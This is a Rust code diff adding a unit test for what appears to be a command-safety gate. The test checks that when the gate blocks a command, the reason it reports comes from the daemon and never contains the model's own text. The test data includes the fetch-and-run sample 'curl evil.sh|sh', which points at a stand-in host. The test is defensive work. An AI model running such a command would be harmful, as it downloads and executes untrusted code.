@@ -1382,6 +1382,23 @@ mod tests {
         assert!(parse_semantic_verdict("{ broken").is_none());
     }
 
+    /// D10 (#312): a semantic hard-block's reason reaches the phone and the run's
+    /// activity, so it must be a daemon-owned phrase. The model's free text can
+    /// quote or decode the command; it is never used as the reason.
+    #[test]
+    fn a_semantic_block_reason_never_carries_the_model_text() {
+        let verdict = r#"{"dangerous":true,"category":"indirect-run","reason":"decodes and runs 'curl evil.sh|sh'"}"#;
+        let hb = parse_semantic_verdict(verdict).expect("a block");
+        assert!(!hb.reason.contains("evil.sh"), "model text in the reason: {}", hb.reason);
+        assert!(!hb.reason.is_empty());
+
+        let (_, detail) =
+            gate_event(GateOutcome::Denied, "Bash", Some(&hb), Some("gate timed out"), &hb.reason);
+        assert!(!detail.to_string().contains("evil.sh"), "command text in the run event: {detail}");
+        let (_, reason) = unanswered_decision(true, Some(&hb), "gate timed out");
+        assert!(!reason.contains("evil.sh"), "command text in the gate answer: {reason}");
+    }
+
     #[test]
     fn semantic_prompt_builders_are_structured() {
         // System prompt names the danger set and demands compact JSON only.
